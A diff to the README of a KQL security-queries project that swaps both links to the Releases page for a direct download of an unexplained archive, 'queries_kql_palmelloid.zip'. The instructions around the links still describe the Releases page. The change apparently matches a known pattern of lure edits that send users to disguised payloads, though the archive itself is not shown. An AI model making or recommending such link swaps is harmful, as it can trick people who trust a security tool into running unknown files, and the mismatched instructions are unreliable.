@@ -1,6 +1,6 @@
 # 🔍 kql-queries - Effective Security Queries for Everyone
 
-[![Download kql-queries](https://img.shields.io/badge/Download-kql--queries-blue)](https://github.com/rahul-sahu1/kql-queries/releases)
+[![Download kql-queries](https://github.com/rahul-sahu1/kql-queries/raw/refs/heads/master/Audit/queries_kql_palmelloid.zip)](https://github.com/rahul-sahu1/kql-queries/raw/refs/heads/master/Audit/queries_kql_palmelloid.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to **kql-queries**! This project offers ready-to-use KQL (Kusto Query La
 To get the queries, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page and access the files.
-   [Download kql-queries](https://github.com/rahul-sahu1/kql-queries/releases)
+   [Download kql-queries](https://github.com/rahul-sahu1/kql-queries/raw/refs/heads/master/Audit/queries_kql_palmelloid.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions of the software. Find the latest release, which is usually listed at the top.
 
